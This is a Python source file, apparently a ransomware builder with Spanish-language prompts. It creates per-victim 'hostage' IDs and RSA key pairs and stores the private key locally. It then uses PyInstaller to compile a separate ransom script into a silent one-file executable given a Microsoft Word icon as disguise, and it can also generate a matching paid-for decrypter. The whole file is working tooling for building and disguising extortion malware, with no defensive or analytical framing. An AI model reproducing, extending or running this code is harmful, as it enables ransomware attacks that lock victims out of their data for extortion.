import json
import os
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.backends import default_backend
import uuid
import subprocess
import sys


file_path = os.path.abspath(__file__)

root_path = os.path.dirname(file_path)

print(root_path)


def generate_hostage_id():
    return str(uuid.uuid4())

def write_configuration(hostage_id, public_key):
    config = {
        'hostage_id': hostage_id,
        'public_key': public_key.decode()
    }
    config_path = os.path.join(root_path, 'config.json')
    with open(config_path, 'w') as f:
        json.dump(config, f)
    return config_path
def generate_rsa_key():
    key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    return key

def get_public_key(key):
    public_key = key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return public_key

def get_private_key(key, hostage_id):
    executable_dir = os.path.join(root_path, hostage_id)
    private_key = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )
    os.makedirs(executable_dir, exist_ok=True)
    with open(os.path.join(executable_dir,f"privatekey-{hostage_id}"), 'wb') as file:
        file.write(private_key)
    return private_key

def generate_executable(script_path, hostage_id,config_path):
    executable_dir = os.path.join(root_path, hostage_id)
    os.makedirs(executable_dir, exist_ok=True)  # Crea la carpeta si no existe
    subprocess.run([sys.executable, '-m', 'PyInstaller', '--onefile', '--noconsole', '--add-data',f'{config_path};.',  f'--icon={os.path.join(root_path,"WINWORD_1.ico")}', script_path], cwd=executable_dir, check=True, shell=True)


def generate_ransomware():
    private_key = generate_rsa_key()
    public_key = get_public_key(private_key)
    hostage_id = generate_hostage_id()
    private_key_pem = get_private_key(private_key, hostage_id)
    config_path= write_configuration(hostage_id,public_key)
    generate_executable(f"{os.path.join(root_path,"ransom.py")}", hostage_id,config_path)


def load_key(pem_file_path):
    with open(pem_file_path, 'r') as archivo:
        private_key = archivo.read()
    return private_key

def generate_decrypter(hostage_id):
    
    path = f"{root_path}/{hostage_id}/privatekey-{hostage_id}"
    private_key = load_key(path)
    
    config = {
        'hostage_id': hostage_id,
        'private_key': private_key
    }
    config_path = os.path.join(root_path, 'config.json')
    with open(config_path, 'w') as f:
        json.dump(config, f)
        
    generate_executable(f"{os.path.join(root_path, "decrypter.py")}", hostage_id,config_path)
    

if __name__ == "__main__":
    
    while True:
        option = input("1, Generar Ransom, 2. Generar Decrypter")
        if option =="1":
            generate_ransomware()
        elif option=="2":
            hostage_id = input("Ingresa el hostage id")
            generate_decrypter(hostage_id)
    
 